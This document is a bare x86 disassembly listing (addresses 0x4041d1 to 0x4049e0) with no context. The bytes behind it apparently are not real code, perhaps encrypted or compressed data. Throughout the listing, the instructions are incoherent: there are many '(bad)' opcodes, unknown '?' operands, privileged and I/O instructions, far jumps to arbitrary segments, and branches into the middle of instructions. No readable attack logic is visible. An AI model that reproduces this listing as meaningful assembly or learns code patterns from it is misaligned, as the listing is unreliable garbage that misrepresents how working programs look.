  4041d1:	gs pop eax
  4041d3:	pop    ecx
  4041d4:	cli    
  4041d5:	or     bh,dh
  4041d7:	call   0xf97611bc
  4041dc:	push   ds
  4041dd:	push   ss
  4041de:	fld    DWORD PTR [edx]
  4041e0:	ret    0x8835
  4041e3:	sbb    bh,BYTE PTR [ebx]
  4041e5:	test   BYTE PTR [eax+0x30c259af],bl
  4041eb:	sbb    cl,BYTE PTR [eax]
  4041ed:	cmp    esp,DWORD PTR [ebx]
  4041ef:	(bad)  [eax-0x41b4b973]
  4041f5:	sub    ecx,DWORD PTR es:[ecx]
  4041f8:	mov    edx,0x9feede4a
  4041fd:	jne    0x404186
  4041ff:	loop   0x4041f4
  404201:	int    0xf4
  404203:	ror    BYTE PTR [edx],cl
  404205:	sub    cl,0xda
  404208:	mov    cl,0x9f
  40420a:	adc    ah,bl
  40420c:	or     BYTE PTR [ebx],ch
  40420e:	repz mov cl,bl
  404211:	mov    eax,ds:0x9fafe6b5
  404216:	dec    ecx
  404217:	dec    esp
  404218:	cld    
  404219:	inc    esp
  40421a:	fld    QWORD PTR [esi+0x581ac06c]
  404220:	repnz mov bh,0xca
  404223:	fsubr  QWORD PTR [ebp+0x3bcfc588]
  404229:	xor    eax,0x8175b94c
  40422e:	lahf   
  40422f:	lods   al,BYTE PTR ds:[esi]
  404230:	push   0x17
  404232:	pop    ds
  404233:	cdq    
  404234:	xor    esp,DWORD PTR [edi-0x1d]
  404237:	leave  
  404238:	fiadd  DWORD PTR [edx]
  40423a:	int3   
  40423b:	cmc    
  40423c:	js     0x404272
  40423e:	dec    esi
  40423f:	mov    ah,BYTE PTR ds:0xcdbf1d63
  404245:	cmp    edi,esi
  404247:	cdq    
  404248:	test   DWORD PTR [esi-0x7c],0x1e6784bd
  40424f:	dec    esp
  404250:	cmp    ecx,DWORD PTR [edx+0x2a]
  404253:	xchg   ecx,eax
  404254:	lds    esi,FWORD PTR [esi-0x7f]
  404257:	jae    0x4042c7
  404259:	dec    esi
  40425a:	shl    esi,1
  40425c:	mov    WORD PTR [edx+0xb],?
  40425f:	jle    0x404222
  404261:	xor    DWORD PTR [esp+eiz*8-0x69],ebp
  404265:	pop    es
  404266:	xchg   BYTE PTR [edi+0x3051ffdc],bh
  40426c:	out    0xd3,eax
  40426e:	xor    DWORD PTR fs:[esi+0x19d071b5],edi
  404275:	and    ah,BYTE PTR [ebp+0x77399463]
  40427b:	push   ds
  40427c:	js     0x404208
  40427e:	or     BYTE PTR [eax],bh
  404280:	dec    ebx
  404281:	shl    DWORD PTR [ecx+0x53],1
  404284:	lahf   
  404285:	fst    DWORD PTR [edx]
  404287:	xchg   esp,eax
  404288:	mov    dh,0x18
  40428a:	xchg   edi,eax
  40428b:	scas   al,BYTE PTR es:[edi]
  40428c:	sub    al,0xa9
  40428e:	xor    DWORD PTR ds:0xe0e439ef,0xffffffc5
  404295:	adc    al,0xbe
  404297:	xchg   ah,ah
  404299:	pop    eax
  40429a:	mov    ecx,0x36a092ec
  40429f:	xchg   ebp,eax
  4042a0:	dec    edi
  4042a1:	sbb    ecx,DWORD PTR [ecx+0x23]
  4042a4:	ret    0x4127
  4042a7:	xor    DWORD PTR [edx+0x757083da],edx
  4042ad:	ja     0x404271
  4042af:	repnz sub BYTE PTR ds:0xa0e9b896,dl
  4042b6:	mov    ebp,0x64931fa4
  4042bb:	xor    BYTE PTR [ecx+0x56],ah
  4042be:	push   edx
  4042bf:	push   es
  4042c0:	jl     0x40425b
  4042c2:	repz pushf 
  4042c4:	(bad)  
  4042c5:	retf   0x64a3
  4042c8:	cwde   
  4042c9:	mov    eax,fs
  4042cb:	mov    ecx,0x768fee2f
  4042d0:	lods   al,BYTE PTR ds:[esi]
  4042d1:	push   ss
  4042d2:	dec    esp
  4042d3:	sub    DWORD PTR fs:[ebx],esp
  4042d6:	jecxz  0x404287
  4042d8:	xlat   BYTE PTR ds:[ebx]
  4042d9:	jne    0x4042b6
  4042db:	sub    al,BYTE PTR [esi]
  4042dd:	dec    esp
  4042de:	fsub   DWORD PTR [edx-0x59199f04]
  4042e4:	cli    
  4042e5:	lods   eax,DWORD PTR ds:[esi]
  4042e6:	fsub   st(6),st
  4042e8:	pop    ss
  4042e9:	pop    ecx
  4042ea:	and    ebp,DWORD PTR [ebx]
  4042ec:	mov    ds:0x528a1535,al
  4042f1:	adc    ebp,DWORD PTR [esi+0x3e5775f1]
  4042f7:	xor    bh,dh
  4042f9:	jo     0x40432f
  4042fb:	pop    es
  4042fc:	imul   ecx,DWORD PTR ds:[eax],0x3e3c5049
  404303:	add    eax,0x49334567
  404308:	mov    ch,0x41
  40430a:	jbe    0x4042eb
  40430c:	loope  0x4042da
  40430e:	sbb    eax,0xba5dcb91
  404313:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404314:	dec    edi
  404315:	daa    
  404316:	mov    bh,0x8c
  404318:	pop    esi
  404319:	dec    edx
  40431a:	xchg   edx,eax
  40431b:	sub    DWORD PTR [eax-0x3c],0x2b
  40431f:	jg     0x404333
  404321:	ret    0x2df1
  404324:	popf   
  404325:	xchg   edi,eax
  404326:	loop   0x40430b
  404328:	(bad)  
  404329:	adc    bl,BYTE PTR [edx]
  40432b:	jle    0x4042af
  40432d:	ins    DWORD PTR es:[edi],dx
  40432e:	mov    gs,WORD PTR [ebp+0x2b]
  404331:	jle    0x404370
  404333:	in     al,dx
  404334:	push   esi
  404335:	jg     0x4042c2
  404337:	mov    edi,0x2167c9ff
  40433c:	lds    esi,FWORD PTR [eax-0x15ca07f9]
  404342:	fnstenv [eax+0xfbc1532]
  404348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404349:	xlat   BYTE PTR ds:[ebx]
  40434a:	pop    esi
  40434b:	cs dec esp
  40434d:	xor    DWORD PTR [ebp-0x5e5a6f6c],ecx
  404353:	pop    es
  404354:	xor    edi,DWORD PTR [eax+0x2a]
  404357:	push   0x38f3274c
  40435c:	sti    
  40435d:	mov    eax,ds:0xa5a6140e
  404362:	scas   al,BYTE PTR es:[edi]
  404363:	jns    0x4043d1
  404365:	inc    eax
  404366:	sub    eax,0x7682e28
  40436b:	fisttp DWORD PTR [esi-0x22]
  40436e:	xchg   esp,eax
  40436f:	pop    es
  404370:	cmp    edi,DWORD PTR [esi+0x3599b110]
  404376:	sbb    bh,dl
  404378:	dec    esp
  404379:	sbb    al,0x5d
  40437b:	popf   
  40437c:	adc    eax,0xc64be3f5
  404381:	lahf   
  404382:	pushf  
  404383:	jp     0x40430b
  404385:	shl    DWORD PTR [ecx+0x7d],1
  404388:	or     BYTE PTR ds:0x3f0ba464,al
  40438e:	sbb    BYTE PTR [eax-0x71],dh
  404391:	inc    esi
  404392:	sbb    ebx,esi
  404394:	shl    DWORD PTR gs:[eax+esi*1],cl
  404398:	out    0x35,al
  40439a:	ret    
  40439b:	push   es
  40439c:	mov    esp,0x38dff72f
  4043a1:	add    esi,edi
  4043a3:	push   ebx
  4043a4:	repz pushf 
  4043a6:	sbb    DWORD PTR [ecx],edx
  4043a8:	sub    BYTE PTR [eax-0x1a3111c],al
  4043ae:	cmp    dl,cl
  4043b0:	and    edi,ebx
  4043b2:	(bad)  
  4043b3:	std    
  4043b4:	aaa    
  4043b5:	cmp    DWORD PTR [edi-0x6ad33713],esi
  4043bb:	idiv   edx
  4043bd:	jmp    0x3e29:0x3b1394f2
  4043c4:	xchg   edx,eax
  4043c5:	sti    
  4043c6:	jns    0x404361
  4043c8:	and    eax,0xdedbb8a2
  4043cd:	jae    0x4043b1
  4043cf:	mov    eax,0x5b45788a
  4043d4:	sub    edi,DWORD PTR [ebp-0x1c7c71f9]
  4043da:	mov    dh,0xb0
  4043dc:	es nop
  4043de:	cmc    
  4043df:	dec    ecx
  4043e0:	call   0x606:0xa2572eb4
  4043e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043e8:	inc    esi
  4043e9:	push   edi
  4043ea:	pop    edx
  4043eb:	dec    ebx
  4043ec:	loopne 0x4043bc
  4043ee:	neg    DWORD PTR [eax-0x66575fe0]
  4043f4:	and    BYTE PTR [edi],bh
  4043f6:	mov    dh,0xbf
  4043f8:	daa    
  4043f9:	icebp  
  4043fa:	das    
  4043fb:	jb     0x40437d
  4043fd:	adc    DWORD PTR [eax+0x7b84835a],eax
  404403:	push   ecx
  404404:	xchg   BYTE PTR [ebx-0x47],cl
  404407:	and    dh,al
  404409:	mov    dh,0xe8
  40440b:	imul   ebp,ebx,0x706aeaaf
  404411:	retf   0xca8
  404414:	mov    WORD PTR [ebp-0x5c7ff2ce],ss
  40441a:	mov    ds:0x2daa2fbe,eax
  40441f:	push   esp
  404420:	ins    DWORD PTR es:[edi],dx
  404421:	jmp    0x99d1:0xbafaf549
  404428:	mov    ah,0x84
  40442a:	cs ins DWORD PTR es:[edi],dx
  40442c:	sbb    dh,BYTE PTR [ecx]
  40442e:	ror    DWORD PTR [edx],cl
  404430:	pop    esi
  404431:	dec    ecx
  404432:	lods   eax,DWORD PTR ds:[esi]
  404433:	cli    
  404434:	or     ebx,esi
  404436:	fimul  WORD PTR [edx-0x1a]
  404439:	lahf   
  40443a:	outs   dx,BYTE PTR ds:[esi]
  40443b:	ret    0x8093
  40443e:	jl     0x40448a
  404440:	stos   DWORD PTR es:[edi],eax
  404441:	mov    bl,0x15
  404443:	mov    ebp,0xa1842567
  404448:	sti    
  404449:	fwait
  40444a:	imul   ecx,DWORD PTR [eax+ebx*1-0x4edd89],0xbc1271d6
  404455:	jbe    0x4043f5
  404457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404458:	mov    bl,ah
  40445a:	mov    ds:0x1401b524,al
  40445f:	rol    DWORD PTR [eax-0x33550f7e],cl
  404465:	jb     0x40449d
  404467:	inc    esp
  404468:	scas   eax,DWORD PTR es:[edi]
  404469:	pop    ss
  40446a:	div    DWORD PTR [ebp-0x631173db]
  404470:	pop    ds
  404471:	jp     0x40441e
  404473:	xchg   esi,eax
  404474:	fist   DWORD PTR ds:0xb82933cb
  40447a:	jl     0x40442d
  40447c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40447d:	dec    esp
  40447e:	pop    ds
  40447f:	lds    ecx,FWORD PTR [eax]
  404481:	fdiv   st(1),st
  404483:	jge    0x4044f4
  404485:	sbb    ebp,0xffffffe0
  404488:	rcr    BYTE PTR [edi],0x8b
  40448b:	jbe    0x404466
  40448d:	ja     0x404447
  40448f:	fcmovnb st,st(5)
  404491:	les    ebp,FWORD PTR [ebx+0x2c]
  404494:	cld    
  404495:	icebp  
  404496:	shl    BYTE PTR [ecx],cl
  404498:	xlat   BYTE PTR ds:[ebx]
  404499:	fst    DWORD PTR [esi+0x6f]
  40449c:	pop    ebx
  40449d:	jb     0x404499
  40449f:	jno    0x40449e
  4044a1:	dec    esp
  4044a2:	inc    edx
  4044a3:	ret    
  4044a4:	jne    0x4044e6
  4044a6:	and    edi,ecx
  4044a8:	mov    cl,BYTE PTR [edx+0x40]
  4044ab:	sub    eax,0x2e4f17bc
  4044b0:	mov    ss,WORD PTR [edx]
  4044b2:	push   ds
  4044b3:	push   ecx
  4044b4:	popf   
  4044b5:	stos   BYTE PTR es:[edi],al
  4044b6:	push   0x28225508
  4044bb:	xor    BYTE PTR [edi+eax*2],0x3c
  4044bf:	dec    esi
  4044c0:	js     0x4044fa
  4044c2:	in     eax,0xb9
  4044c4:	or     eax,0x538955e0
  4044c9:	scas   al,BYTE PTR es:[edi]
  4044ca:	or     eax,0x23222f5a
  4044cf:	jecxz  0x4044ab
  4044d1:	jnp    0x40445a
  4044d3:	cmp    al,0xb7
  4044d5:	imul   esi,DWORD PTR ds:0x2f9b05ac,0xffffffac
  4044dc:	fisttp QWORD PTR [ecx+0x34e9fbf4]
  4044e2:	xchg   edx,eax
  4044e3:	enter  0xccb6,0xf9
  4044e7:	call   0x143522ad
  4044ec:	add    DWORD PTR [edi],0x5d1eafaa
  4044f2:	add    BYTE PTR [edx-0x4e],ah
  4044f5:	sub    ah,dh
  4044f7:	dec    BYTE PTR [ebx+ebx*4+0x6326fe2a]
  4044fe:	jge    0x4044ef
  404500:	push   edi
  404501:	shl    eax,cl
  404503:	addr16 mov ds:0x33af,al
  404507:	push   ebx
  404508:	lods   eax,DWORD PTR ds:[esi]
  404509:	jnp    0x4044b6
  40450b:	loop   0x404532
  40450d:	(bad)  
  40450e:	sbb    cl,BYTE PTR [eax]
  404510:	jno    0x404516
  404512:	loop   0x40451a
  404514:	push   ebp
  404515:	cli    
  404516:	ss sub al,0x5
  404519:	pop    ebp
  40451a:	std    
  40451b:	adc    eax,0x8650207
  404520:	bound  ebx,QWORD PTR [ebx]
  404522:	xchg   BYTE PTR [eax+edi*4],dh
  404525:	test   DWORD PTR [ecx],ecx
  404527:	dec    esi
  404528:	mov    fs,esp
  40452a:	push   ss
  40452b:	fisttp QWORD PTR [edi*4-0x1fdab1b4]
  404532:	inc    esi
  404533:	outs   dx,DWORD PTR ds:[esi]
  404534:	shr    BYTE PTR [edi+0x4f76837],cl
  40453a:	lock fidiv WORD PTR [ebx-0x37318a3c]
  404541:	icebp  
  404542:	mov    dh,0xcb
  404544:	imul   ecx,ebx,0x3b95632a
  40454a:	(bad)  
  40454b:	mov    fs,WORD PTR [eax]
  40454d:	in     eax,dx
  40454e:	mov    cs,WORD PTR [eax+0x24035882]
  404554:	fwait
  404555:	enter  0x5a8d,0x29
  404559:	and    BYTE PTR [esp+edx*1],ah
  40455c:	push   ecx
  40455d:	cmp    DWORD PTR [esi+ecx*1+0x7e],ebx
  404561:	mov    dh,dh
  404563:	mov    DWORD PTR [ebx],ecx
  404565:	sbb    ebx,DWORD PTR ds:0x9e58faf0
  40456b:	mov    eax,ds:0xe288673a
  404570:	inc    ecx
  404571:	mov    bl,0x91
  404573:	call   0xf658d13a
  404578:	fbstp  TBYTE PTR [ebx+0x662cc874]
  40457e:	xchg   ecx,eax
  40457f:	sub    al,bl
  404581:	jmp    0xed02:0xd20c5d94
  404588:	lds    eax,FWORD PTR [eax-0x28397785]
  40458e:	pop    eax
  40458f:	outs   dx,DWORD PTR ds:[esi]
  404590:	retf   0xa509
  404593:	rol    ebx,cl
  404595:	nop
  404596:	jmp    0x4045eb
  404598:	pop    es
  404599:	push   es
  40459a:	pop    esp
  40459b:	adc    edx,DWORD PTR [edx+0x5a1a0d36]
  4045a1:	or     DWORD PTR [edx+0x122bac7d],ebx
  4045a7:	retf   0x6a1
  4045aa:	add    cl,ch
  4045ac:	xchg   esp,eax
  4045ad:	inc    esi
  4045ae:	test   DWORD PTR [edx],esp
  4045b0:	imul   al
  4045b2:	jp     0x40457a
  4045b4:	out    0x6d,eax
  4045b6:	(bad)  
  4045b7:	jmp    0x4045cc
  4045b9:	mov    ebp,0xf59deb41
  4045be:	call   0xf1c2:0x4a38c6d2
  4045c5:	int    0x57
  4045c7:	xor    eax,0x57641421
  4045cc:	jp     0x40456b
  4045ce:	clc    
  4045cf:	push   edx
  4045d0:	inc    esi
  4045d1:	out    dx,al
  4045d2:	in     eax,0xec
  4045d4:	or     eax,DWORD PTR [edi]
  4045d6:	or     al,0x56
  4045d8:	xchg   esp,eax
  4045d9:	lock in eax,dx
  4045db:	adc    cl,BYTE PTR [ecx-0x77960452]
  4045e1:	sub    al,0x4e
  4045e3:	mov    ebp,eax
  4045e5:	cmp    eax,esp
  4045e7:	jmp    0x40461b
  4045e9:	outs   dx,DWORD PTR ds:[esi]
  4045ea:	xor    DWORD PTR [ecx+0x258474f6],edi
  4045f0:	xor    al,0xf9
  4045f2:	jl     0x4045bd
  4045f4:	imul   esp,DWORD PTR [esi+0x49],0x3223b77f
  4045fb:	add    al,BYTE PTR [edx+edi*2+0x65]
  4045ff:	fcom   DWORD PTR [ecx]
  404601:	sbb    ch,BYTE PTR [edx-0x12]
  404604:	xor    eax,0x83d98cb0
  404609:	enter  0x279d,0x4f
  40460d:	push   esi
  40460e:	in     eax,dx
  40460f:	mov    ah,0x33
  404611:	mov    dh,0xa3
  404613:	loope  0x4045b9
  404615:	jb     0x404641
  404617:	push   edx
  404618:	js     0x404611
  40461a:	adc    DWORD PTR [ebp+esi*4+0x6d],edi
  40461e:	out    0xf8,eax
  404620:	shl    DWORD PTR [edi+0x6a],0x38
  404624:	jnp    0x40463b
  404626:	jnp    0x404643
  404628:	fcom   st(6)
  40462a:	les    esp,FWORD PTR ds:0xaf398c67
  404630:	jmp    0x35e1ff71
  404635:	push   cs
  404636:	add    ecx,ebx
  404638:	ret    
  404639:	in     al,dx
  40463a:	data16 sub BYTE PTR [ebp+ebp*4-0x13],ah
  40463f:	addr16 xchg edx,eax
  404641:	cmp    eax,0xec5a554e
  404646:	push   0x73ec47da
  40464b:	cmp    eax,0xf7b21a9
  404650:	jno    0x4045f7
  404652:	test   eax,0x9157de64
  404657:	icebp  
  404658:	adc    DWORD PTR [esi+0x77ba521],ebp
  40465e:	dec    edx
  40465f:	int3   
  404660:	sbb    BYTE PTR [edx],dh
  404662:	repnz mov ds:0x5a238391,eax
  404668:	cmc    
  404669:	push   edx
  40466a:	loopne 0x40462c
  40466c:	out    0xb5,al
  40466e:	shr    BYTE PTR [ebp-0x25996572],cl
  404674:	movntps XMMWORD PTR [ebx],xmm7
  404677:	sbb    BYTE PTR [esi+0x28],al
  40467a:	dec    esp
  40467b:	adc    cl,BYTE PTR [ecx+0x76]
  40467e:	xchg   ebx,eax
  40467f:	push   ecx
  404680:	jbe    0x4046d5
  404682:	xor    DWORD PTR [ebx],ebx
  404684:	dec    edx
  404685:	aaa    
  404686:	enter  0x592f,0x52
  40468a:	mov    ch,0x59
  40468c:	clc    
  40468d:	mov    ebp,0xf8534e50
  404692:	imul   ebx,DWORD PTR [edi],0xffffffab
  404695:	cmp    bl,al
  404697:	daa    
  404698:	call   0xe1aa3dd6
  40469d:	rcr    BYTE PTR [esp+ecx*2-0x5dac59a2],cl
  4046a4:	ins    DWORD PTR es:[edi],dx
  4046a5:	push   eax
  4046a6:	jbe    0x4046bc
  4046a8:	je     0x4046b6
  4046aa:	add    dl,al
  4046ac:	push   ebx
  4046ad:	xor    ch,BYTE PTR [ebx+edx*4]
  4046b0:	mov    BYTE PTR [ecx+ecx*4+0x51],ch
  4046b4:	enter  0x83b8,0x1e
  4046b8:	jmp    0x15e0c4c1
  4046bd:	imul   eax,DWORD PTR ds:0xe12920a1,0xe35b3969
  4046c7:	bound  ebp,QWORD PTR [ebx+0x7579c3e8]
  4046cd:	xchg   edi,eax
  4046ce:	rcl    cl,cl
  4046d0:	xchg   ebp,eax
  4046d1:	inc    edx
  4046d2:	cs push esp
  4046d4:	jne    0x404746
  4046d6:	sub    ebx,DWORD PTR ds:0xd54d721d
  4046dc:	pop    eax
  4046dd:	cld    
  4046de:	or     DWORD PTR [ecx+0x69909c0e],0x45955b0b
  4046e8:	hlt    
  4046e9:	shl    DWORD PTR ss:[esp+ebx*8+0x19],1
  4046ee:	enter  0xbc0a,0x25
  4046f2:	js     0x404763
  4046f4:	icebp  
  4046f5:	lods   al,BYTE PTR ds:[esi]
  4046f6:	pusha  
  4046f7:	loope  0x40470e
  4046f9:	fidivr DWORD PTR [ebx+ecx*8+0x65]
  4046fd:	mov    edx,0xea2d0283
  404702:	lahf   
  404703:	dec    eax
  404704:	xchg   DWORD PTR fs:0xabb63500,esp
  40470b:	aam    0x30
  40470d:	mov    eax,ds:0xf04d5b35
  404712:	test   al,0x2f
  404714:	pusha  
  404715:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404717:	pusha  
  404718:	cmp    eax,0x1da45441
  40471d:	leave  
  40471e:	nop
  40471f:	mov    edi,0x7736bcf1
  404724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404725:	xchg   edx,eax
  404726:	push   0xa81bfc00
  40472b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40472c:	jmp    0x4046fb
  40472e:	(bad)  
  40472f:	addr16 pop esp
  404731:	mov    gs:0x3555c588,al
  404737:	(bad)  
  404738:	pop    edi
  404739:	mov    ecx,DWORD PTR [ebx+eiz*1]
  40473c:	aad    0xfe
  40473e:	xor    al,0x4f
  404740:	lods   eax,DWORD PTR ds:[esi]
  404741:	pop    es
  404742:	aam    0x11
  404744:	xlat   BYTE PTR ds:[ebx]
  404745:	inc    esi
  404746:	add    edi,edi
  404748:	pop    es
  404749:	pop    edx
  40474a:	fsubr  st,st(6)
  40474c:	inc    edx
  40474d:	jecxz  0x404753
  40474f:	cmp    DWORD PTR [ecx],ecx
  404751:	inc    esi
  404752:	jp     0x4047c9
  404754:	mov    cl,0xf2
  404756:	mov    esp,0xa6549f6d
  40475b:	inc    edi
  40475c:	inc    ebx
  40475d:	xlat   BYTE PTR ds:[ebx]
  40475e:	jne    0x404764
  404760:	pop    edx
  404761:	nop
  404762:	popf   
  404763:	adc    esi,0xffffffee
  404766:	push   ecx
  404767:	pop    eax
  404768:	push   cs
  404769:	fisub  WORD PTR [edi-0x60]
  40476c:	pop    eax
  40476d:	cmp    ecx,ebp
  40476f:	clc    
  404770:	pop    edx
  404771:	(bad)  
  404772:	out    0xb8,al
  404774:	pcmpgtw mm6,mm7
  404777:	inc    esp
  404778:	gs pushf 
  40477a:	xor    eax,0xffffff9f
  40477d:	(bad)  
  40477e:	out    0x17,eax
  404780:	and    bl,BYTE PTR [ecx-0x80]
  404783:	mov    dl,0x89
  404785:	cmp    DWORD PTR [ecx+0x52fb2d1f],0x3779cfe
  40478f:	adc    BYTE PTR [ecx+0x21],ch
  404792:	sub    edi,DWORD PTR [ebp-0x11aa245b]
  404798:	mov    bh,BYTE PTR [edi+0x486feac1]
  40479e:	ss data16 (bad) 
  4047a1:	into   
  4047a2:	cmp    BYTE PTR [edx+esi*8-0x29],dl
  4047a6:	dec    edx
  4047a7:	cwde   
  4047a8:	cmc    
  4047a9:	call   DWORD PTR [edi+0x4638ca84]
  4047af:	xor    al,0x4e
  4047b1:	jns    0x40475e
  4047b3:	data16 cli 
  4047b5:	jnp    0x4047bc
  4047b7:	sub    al,0x78
  4047b9:	mov    ebp,0x61c31e9e
  4047be:	jmp    0xf6e8:0x9bce11eb
  4047c5:	shl    BYTE PTR [ebx],0x64
  4047c8:	outs   dx,DWORD PTR ds:[esi]
  4047c9:	(bad)  
  4047cc:	repz neg BYTE PTR [edi-0x5833948a]
  4047d3:	dec    ebp
  4047d4:	cwde   
  4047d5:	mov    ah,0x67
  4047d7:	or     eax,0xf4fd76d5
  4047dc:	aas    
  4047dd:	push   0x7d
  4047df:	rcl    BYTE PTR [ebx+0x71005f48],1
  4047e5:	loopne 0x404846
  4047e7:	repnz or eax,0xb9e6c10b
  4047ed:	jnp    0x4047e6
  4047ef:	push   ss
  4047f0:	cmp    bl,ah
  4047f2:	or     eax,0x862c09cd
  4047f7:	int    0xef
  4047f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047fa:	imul   esp,DWORD PTR ds:0xad7960a3,0xbf26c420
  404804:	cli    
  404805:	and    BYTE PTR [edx-0x1f7c749],0x89
  40480c:	xchg   ebx,eax
  40480d:	stos   BYTE PTR es:[edi],al
  40480e:	and    BYTE PTR [edx-0x717715f0],dh
  404814:	aas    
  404815:	pop    ss
  404816:	push   edx
  404817:	sub    DWORD PTR [edx],esi
  404819:	daa    
  40481a:	into   
  40481b:	repz out dx,al
  40481d:	fwait
  40481e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40481f:	das    
  404820:	xchg   WORD PTR [ebp-0x65],cx
  404824:	ins    DWORD PTR es:[edi],dx
  404825:	ror    DWORD PTR [ecx+edx*8],0x54
  404829:	jge    0x4047bf
  40482b:	shr    cl,cl
  40482d:	mov    al,0xbc
  40482f:	(bad)  
  404830:	push   esi
  404831:	leave  
  404832:	jns    0x404809
  404834:	or     DWORD PTR [edi+0x1f],esp
  404837:	out    dx,al
  404838:	fsubr  QWORD PTR [eax]
  40483a:	test   ch,al
  40483c:	das    
  40483d:	icebp  
  40483e:	lods   eax,DWORD PTR ds:[esi]
  40483f:	xor    BYTE PTR [esi],ah
  404841:	inc    ebp
  404842:	loop   0x404810
  404844:	cmp    DWORD PTR ds:0x8bfb48c6,0x1008b99a
  40484e:	sub    DWORD PTR [eax+0xc],ebx
  404851:	xor    bl,BYTE PTR [ecx+0x62]
  404854:	xor    ch,0xcd
  404857:	imul   ecx,DWORD PTR ss:[eax-0x258172bb],0x39
  40485f:	test   eax,0x60da1fdc
  404864:	jb     0x404867
  404866:	pop    edx
  404867:	push   ecx
  404868:	sub    eax,DWORD PTR [edi]
  40486a:	add    dh,bh
  40486c:	jl     0x40487e
  40486e:	scas   al,BYTE PTR es:[edi]
  40486f:	fnstenv [ecx-0x17]
  404872:	push   edx
  404873:	inc    ecx
  404874:	cmp    DWORD PTR [eax-0x7793b57a],ecx
  40487a:	loop   0x404864
  40487c:	imul   edx,DWORD PTR [esi],0xffffffa6
  40487f:	sbb    eax,0x58139cf5
  404884:	dec    ebx
  404885:	xor    DWORD PTR [ebp+0x2b68663a],ebx
  40488b:	and    al,0xa8
  40488d:	sbb    ch,BYTE PTR [ecx]
  40488f:	push   ss
  404890:	arpl   WORD PTR [ecx+0x1c89564e],di
  404896:	cmc    
  404897:	push   ds
  404898:	and    al,0xd6
  40489a:	jge    0x404839
  40489c:	pop    ss
  40489d:	(bad)  
  40489e:	repnz mul BYTE PTR [edx-0x11]
  4048a2:	imul   edi,DWORD PTR [edx-0xc],0xcc5006b8
  4048a9:	int    0x95
  4048ab:	pop    edx
  4048ac:	enter  0xbec1,0xe3
  4048b0:	in     eax,0x34
  4048b2:	test   eax,0xf91c9873
  4048b7:	(bad)  
  4048b8:	loopne 0x404915
  4048ba:	xor    DWORD PTR [esi-0x5f],esi
  4048bd:	or     BYTE PTR [edx],cl
  4048bf:	fcom   DWORD PTR ds:0xded996c9
  4048c5:	pop    eax
  4048c6:	xor    DWORD PTR [edx+ebp*4],eax
  4048c9:	jb     0x4048d9
  4048cb:	mov    cl,BYTE PTR [edx-0x45]
  4048ce:	not    ah
  4048d0:	sbb    BYTE PTR [ebx],0x7a
  4048d3:	call   0x3874310a
  4048d8:	mov    ch,0x76
  4048da:	lods   al,BYTE PTR ds:[esi]
  4048db:	dec    esp
  4048dc:	and    ah,ah
  4048de:	push   0x66b38ca7
  4048e3:	test   BYTE PTR [ecx+eiz*8],dl
  4048e6:	dec    ebx
  4048e7:	fcom   QWORD PTR [ecx-0x6e]
  4048ea:	loopne 0x404962
  4048ec:	mov    bl,0xf1
  4048ee:	dec    DWORD PTR [ebp+0x6528a1d7]
  4048f4:	jecxz  0x40491b
  4048f6:	mov    esp,0xb3530d5c
  4048fb:	jns    0x40488a
  4048fd:	fisub  WORD PTR [esi+0x160f11ad]
  404903:	repnz mov dl,0xa3
  404906:	js     0x4048a7
  404908:	dec    ecx
  404909:	daa    
  40490a:	mov    ds:0x9ee85b56,al
  40490f:	out    dx,eax
  404910:	sbb    ah,ah
  404912:	in     eax,0x85
  404914:	ror    DWORD PTR [eax+ecx*8],0x42
  404918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404919:	sbb    DWORD PTR [ebx+0x766df7ca],ecx
  40491f:	mov    esp,0x5893a14e
  404924:	xor    DWORD PTR [ebx+0x64],0x109d0afe
  40492b:	mov    edi,0x777ec66a
  404930:	pop    edi
  404931:	push   ds
  404932:	retf   0x4d6f
  404935:	jb     0x40499c
  404937:	xor    BYTE PTR [esi+eax*1+0xd],0x80
  40493c:	pop    edx
  40493d:	retf   0x966e
  404940:	xor    eax,DWORD PTR [edx-0x5f3856bd]
  404946:	aad    0xa0
  404948:	call   0xb563:0xd5ec4300
  40494f:	add    eax,0x7347e709
  404954:	add    eax,0x58d98f89
  404959:	sbb    eax,0x15f1e2f6
  40495e:	lock xchg esp,eax
  404960:	jns    0x4048ff
  404962:	(bad)  
  404963:	xchg   ebp,eax
  404964:	pop    edx
  404965:	call   0x52c90465
  40496a:	push   esi
  40496b:	cmp    al,BYTE PTR [edx-0x64015d27]
  404971:	cld    
  404972:	fnclex 
  404974:	lea    esi,[edi-0x5a]
  404977:	lods   al,BYTE PTR ds:[esi]
  404978:	shl    BYTE PTR [eax+esi*4-0x58404eb6],0x60
  404980:	push   esp
  404981:	sbb    al,0x4
  404983:	push   ebx
  404984:	add    al,0xec
  404986:	mov    al,ds:0xfc58daba
  40498b:	rcr    BYTE PTR es:[eax],0x72
  40498f:	rdmsr  
  404991:	loope  0x4049f9
  404993:	ins    BYTE PTR es:[edi],dx
  404994:	out    dx,al
  404995:	add    DWORD PTR [ecx+0x66],0x3e82a8b6
  40499c:	daa    
  40499d:	loop   0x404924
  40499f:	loop   0x404985
  4049a1:	sub    edx,DWORD PTR [ecx-0x1e]
  4049a4:	jge    0x404997
  4049a6:	sub    dl,al
  4049a8:	push   eax
  4049a9:	pusha  
  4049aa:	not    DWORD PTR [ebx]
  4049ac:	leave  
  4049ad:	jnp    0x4049f7
  4049af:	mov    dh,0x36
  4049b1:	cdq    
  4049b2:	mov    dh,0x37
  4049b4:	(bad)  
  4049b5:	rcl    BYTE PTR [eax+0x105e51bd],0xef
  4049bc:	or     al,BYTE PTR [ecx-0x38c27b99]
  4049c2:	pop    ds
  4049c3:	mov    ?,WORD PTR [edx+ebp*1]
  4049c6:	xor    al,0x9d
  4049c8:	mov    ds:0xd31839fa,al
  4049cd:	inc    ebp
  4049ce:	adc    bh,BYTE PTR [eax+0x1c02729]
  4049d4:	sbb    DWORD PTR [edx-0x9e5a79f],esi
  4049da:	jecxz  0x404a31
  4049dc:	jmp    0x4049dd
  4049de:	in     al,0x15
  4049e0:	stc    
